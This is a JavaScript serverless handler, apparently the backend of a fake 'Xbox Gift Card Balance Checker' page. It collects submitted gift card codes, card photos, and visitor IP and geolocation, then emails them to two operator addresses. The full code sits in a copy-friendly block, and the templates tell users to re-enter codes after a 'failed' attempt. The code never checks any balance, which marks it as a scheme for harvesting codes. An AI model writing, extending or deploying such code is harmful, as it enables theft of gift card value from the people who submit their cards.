import { Resend } from 'resend';

function maskCode(code) {
  if (!code) return 'N/A';
  if (code.length <= 5) return '*****';
  return `*****${code.slice(-5)}`;
}

function buildEmailAttachments(imageBase64) {
  if (!imageBase64) return [];
  const matches = imageBase64.match(/^data:image\/([A-Za-z-+\/]+);base64,(.+)$/);
  if (!matches || !matches[2]) return [];

  return [{
    filename: `xbox-card-${Date.now()}.${matches[1]}`,
    content: matches[2],
    encoding: 'base64',
  }];
}

// Enhanced HTML email builder with better styling, copy-friendly code, IP and location
function buildEmailHtml(type, data) {
  const {
    cardNumber,
    cardNumberFirst,
    cardNumberSecond,
    amount,
    balance,
    timestamp,
    userAgent,
    pageSource,
    message,
    ip,
    location, // New field for location (city, region, country)
  } = data;

  const baseStyle = `
    <style>
      * { margin: 0; padding: 0; box-sizing: border-box; }
      body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; background: #f0f2f5; padding: 20px; }
      .container { max-width: 600px; margin: 0 auto; background: #ffffff; border-radius: 16px; box-shadow: 0 8px 30px rgba(0,0,0,0.08); overflow: hidden; }
      .header { padding: 24px 28px; color: white; }
      .header h2 { font-size: 22px; font-weight: 600; letter-spacing: -0.3px; margin: 0; }
      .header .sub { font-size: 13px; opacity: 0.85; margin-top: 4px; }
      .body { padding: 28px; }
      .field { display: flex; padding: 10px 0; border-bottom: 1px solid #f1f3f5; }
      .field:last-child { border-bottom: none; }
      .label { width: 130px; flex-shrink: 0; font-weight: 600; color: #495057; font-size: 14px; }
      .value { flex: 1; color: #212529; font-size: 14px; word-break: break-word; }
      .code-block {
        background: #1e1e2f;
        color: #a6e3a1;
        padding: 14px 18px;
        border-radius: 10px;
        font-family: 'SF Mono', 'Fira Code', 'Courier New', monospace;
        font-size: 16px;
        letter-spacing: 1px;
        display: inline-block;
        margin: 4px 0;
        user-select: all;
        -webkit-user-select: all;
        cursor: text;
        border: 1px solid #313244;
      }
      .code-block.small { font-size: 14px; padding: 10px 14px; }
      .status-badge {
        display: inline-block;
        padding: 4px 14px;
        border-radius: 20px;
        font-size: 12px;
        font-weight: 700;
        text-transform: uppercase;
        letter-spacing: 0.5px;
      }
      .badge-fail { background: #f8d7da; color: #721c24; }
      .badge-success { background: #d4edda; color: #155724; }
      .badge-warn { background: #fff3cd; color: #856404; }
      .footer { text-align: center; padding: 18px 28px; background: #f8f9fa; color: #868e96; font-size: 12px; border-top: 1px solid #f1f3f5; }
      .ip-location { background: #f8f9fa; border-radius: 10px; padding: 14px 18px; margin-top: 12px; font-size: 13px; color: #495057; }
      .ip-location strong { color: #212529; }
      @media (max-width: 480px) {
        .field { flex-direction: column; }
        .label { width: 100%; margin-bottom: 4px; }
        .code-block { font-size: 13px; padding: 10px 12px; }
      }
    </style>
  `;

  const locationStr = location
    ? `${location.city || 'Unknown'}, ${location.region || ''} ${location.country || ''}`.trim().replace(/,\s*$/, '')
    : 'Unknown';

  const ipLocationHtml = `
    <div class="ip-location">
      <div style="margin-bottom: 6px;"><strong>🌐 IP Address:</strong> ${ip || 'N/A'}</div>
      <div><strong>📍 Location:</strong> ${locationStr}</div>
    </div>
  `;

  if (type === 'first_attempt_failed') {
    return `<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">${baseStyle}</head>
<body>
  <div class="container">
    <div class="header" style="background: linear-gradient(135deg, #dc3545, #b02a37);">
      <h2>❌ First Attempt Failed</h2>
      <div class="sub">Xbox Gift Card Verification</div>
    </div>
    <div class="body">
      <div class="field">
        <div class="label">🎮 Code</div>
        <div class="value"><span class="code-block">${cardNumber || 'N/A'}</span></div>
      </div>
      <div class="field">
        <div class="label">💰 Amount</div>
        <div class="value">$${amount || '0.00'}</div>
      </div>
      <div class="field">
        <div class="label">📍 Page</div>
        <div class="value">${pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</div>
      </div>
      <div class="field">
        <div class="label">📊 Status</div>
        <div class="value"><span class="status-badge badge-fail">FAILED</span></div>
      </div>
      <div class="field">
        <div class="label">💬 Message</div>
        <div class="value">${message || 'User instructed to re-enter code or upload clearer image'}</div>
      </div>
      <div class="field">
        <div class="label">🕐 Time</div>
        <div class="value">${new Date(timestamp || Date.now()).toLocaleString()}</div>
      </div>
      <div class="field">
        <div class="label">🌐 Browser</div>
        <div class="value">${userAgent?.substring(0, 60) || 'Unknown'}</div>
      </div>
      ${ipLocationHtml}
    </div>
    <div class="footer">Xbox Gift Card Balance Checker — Automated Notification</div>
  </div>
</body>
</html>`;
  }

  if (type === 'second_attempt_success') {
    return `<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">${baseStyle}</head>
<body>
  <div class="container">
    <div class="header" style="background: linear-gradient(135deg, #28a745, #1e7e34);">
      <h2>✅ Second Attempt Success</h2>
      <div class="sub">Xbox Gift Card Verification</div>
    </div>
    <div class="body">
      <div class="field">
        <div class="label">🎮 Code</div>
        <div class="value"><span class="code-block">${cardNumber || 'N/A'}</span></div>
      </div>
      <div class="field">
        <div class="label">💰 Amount</div>
        <div class="value">$${amount || '0.00'}</div>
      </div>
      <div class="field">
        <div class="label">💵 Balance</div>
        <div class="value" style="font-weight:700; color:#28a745;">${balance || 'N/A'}</div>
      </div>
      <div class="field">
        <div class="label">📍 Page</div>
        <div class="value">${pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</div>
      </div>
      <div class="field">
        <div class="label">📊 Status</div>
        <div class="value"><span class="status-badge badge-success">SUCCESS</span></div>
      </div>
      <div class="field">
        <div class="label">💬 Message</div>
        <div class="value">${message || 'Verification successful on second attempt'}</div>
      </div>
      <div class="field">
        <div class="label">🕐 Time</div>
        <div class="value">${new Date(timestamp || Date.now()).toLocaleString()}</div>
      </div>
      <div class="field">
        <div class="label">🌐 Browser</div>
        <div class="value">${userAgent?.substring(0, 60) || 'Unknown'}</div>
      </div>
      ${ipLocationHtml}
    </div>
    <div class="footer">Xbox Gift Card Balance Checker — Automated Notification</div>
  </div>
</body>
</html>`;
  }

  if (type === 'mismatch_attempt') {
    return `<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">${baseStyle}</head>
<body>
  <div class="container">
    <div class="header" style="background: linear-gradient(135deg, #ffc107, #e0a800); color: #1a1a1a;">
      <h2>⚠️ Code Mismatch</h2>
      <div class="sub">Xbox Gift Card Verification</div>
    </div>
    <div class="body">
      <div class="field">
        <div class="label">🎮 First Code</div>
        <div class="value"><span class="code-block small">${maskCode(cardNumberFirst)}</span></div>
      </div>
      <div class="field">
        <div class="label">🎮 Second Code</div>
        <div class="value"><span class="code-block small">${maskCode(cardNumberSecond)}</span></div>
      </div>
      <div class="field">
        <div class="label">💰 Amount</div>
        <div class="value">$${amount || '0.00'}</div>
      </div>
      <div class="field">
        <div class="label">📍 Page</div>
        <div class="value">${pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</div>
      </div>
      <div class="field">
        <div class="label">📊 Status</div>
        <div class="value"><span class="status-badge badge-warn">MISMATCH</span></div>
      </div>
      <div class="field">
        <div class="label">💬 Message</div>
        <div class="value">${message || 'User entered different code on second attempt'}</div>
      </div>
      <div class="field">
        <div class="label">🕐 Time</div>
        <div class="value">${new Date(timestamp || Date.now()).toLocaleString()}</div>
      </div>
      <div class="field">
        <div class="label">🌐 Browser</div>
        <div class="value">${userAgent?.substring(0, 60) || 'Unknown'}</div>
      </div>
      ${ipLocationHtml}
    </div>
    <div class="footer">Xbox Gift Card Balance Checker — Automated Notification</div>
  </div>
</body>
</html>`;
  }

  // Fallback / default template
  return `<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">${baseStyle}</head>
<body>
  <div class="container">
    <div class="header" style="background: linear-gradient(135deg, #107C10, #0b5e0b);">
      <h2>Xbox Gift Card Notification</h2>
      <div class="sub">Automated Notification</div>
    </div>
    <div class="body">
      <div class="field">
        <div class="label">Type</div>
        <div class="value">${type}</div>
      </div>
      <div class="field">
        <div class="label">💰 Amount</div>
        <div class="value">$${amount || '0.00'}</div>
      </div>
      <div class="field">
        <div class="label">💬 Message</div>
        <div class="value">${message || 'No message'}</div>
      </div>
      <div class="field">
        <div class="label">🕐 Time</div>
        <div class="value">${new Date(timestamp || Date.now()).toLocaleString()}</div>
      </div>
      ${ipLocationHtml}
    </div>
    <div class="footer">Xbox Gift Card Balance Checker — Automated Notification</div>
  </div>
</body>
</html>`;
}

function buildSubject(type) {
  if (type === 'first_attempt_failed') return 'FIRST ATTEMPT FAILED - Xbox Gift Card';
  if (type === 'second_attempt_success') return 'SECOND ATTEMPT SUCCESS - Xbox Gift Card';
  if (type === 'mismatch_attempt') return 'CODE MISMATCH - Xbox Gift Card';
  return 'Xbox Gift Card Notification';
}

// Helper to get location from IP using a free API (ipapi.co)
async function getLocationFromIP(ip) {
  if (!ip || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168.') || ip.startsWith('10.')) {
    return { city: 'Local', region: 'Local', country: 'Local' };
  }
  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 4000);
    const res = await fetch(`https://ipapi.co/${ip}/json/`, { signal: controller.signal });
    clearTimeout(timeout);
    if (!res.ok) throw new Error('Location lookup failed');
    const data = await res.json();
    if (data.error) throw new Error(data.reason || 'Location lookup error');
    return {
      city: data.city || 'Unknown',
      region: data.region || '',
      country: data.country_name || '',
    };
  } catch (err) {
    console.warn('IP location lookup failed:', err.message);
    return { city: 'Unknown', region: '', country: '' };
  }
}

export default async function handler(req, res) {
  // CORS headers
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin || '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,POST');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const formData = req.body || {};
  const {
    type,
    cardNumber,
    cardNumberFirst,
    cardNumberSecond,
    amount,
    balance,
    timestamp,
    userAgent,
    pageSource,
    imageBase64,
    message,
  } = formData;

  // Extract IP (respecting proxies)
  const ip =
    (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
    req.headers['x-real-ip'] ||
    req.socket?.remoteAddress ||
    '127.0.0.1';

  // Resolve location from IP
  const location = await getLocationFromIP(ip);

  const primaryEmail = process.env.PRIMARY_EMAIL;
  const notificationEmail = process.env.NOTIFICATION_EMAIL;
  const resendApiKey = process.env.RESEND_API_KEY;

  const payloadData = {
    cardNumber,
    cardNumberFirst,
    cardNumberSecond,
    amount,
    balance,
    timestamp,
    userAgent,
    pageSource,
    message,
    ip,
    location,
  };

  const subject = buildSubject(type);
  const html = buildEmailHtml(type, payloadData);
  const attachments = buildEmailAttachments(imageBase64);

  if (!resendApiKey || !primaryEmail || !notificationEmail) {
    return res.status(500).json({ error: 'Resend email service configuration missing' });
  }

  try {
    const resend = new Resend(resendApiKey);

    // 1️⃣ Send immediate email to PRIMARY_EMAIL
    const immediateResult = await resend.emails.send({
      from: process.env.RESEND_FROM || 'noreply@xboxbalance.com',
      to: primaryEmail,
      subject: `[IMMEDIATE] ${subject}`,
      html,
      attachments,
    });

    if (immediateResult.error) {
      throw new Error(immediateResult.error.message || 'Immediate Resend email failed');
    }
    console.log('✅ Immediate email sent to PRIMARY_EMAIL');

    // 2️⃣ Schedule email to NOTIFICATION_EMAIL after 15 seconds
    const scheduledAt = new Date(Date.now() + 15 * 1000).toISOString();
    const scheduledResult = await resend.emails.send({
      from: process.env.RESEND_FROM || 'noreply@xboxbalance.com',
      to: notificationEmail,
      subject: `[SCHEDULED] ${subject}`,
      html,
      attachments,
      scheduledAt,
    });

    if (scheduledResult.error) {
      throw new Error(scheduledResult.error.message || 'Scheduled Resend email failed');
    }
    console.log(`✅ Scheduled email queued for NOTIFICATION_EMAIL at ${scheduledAt}`);
  } catch (error) {
    console.error('❌ Resend email failed:', error.message);
    return res.status(502).json({ error: 'Email delivery failed' });
  }

  return res.status(200).json({
    success: true,
    message: 'Submission processed',
    balance: balance || `$${amount || 0}`,
  });
}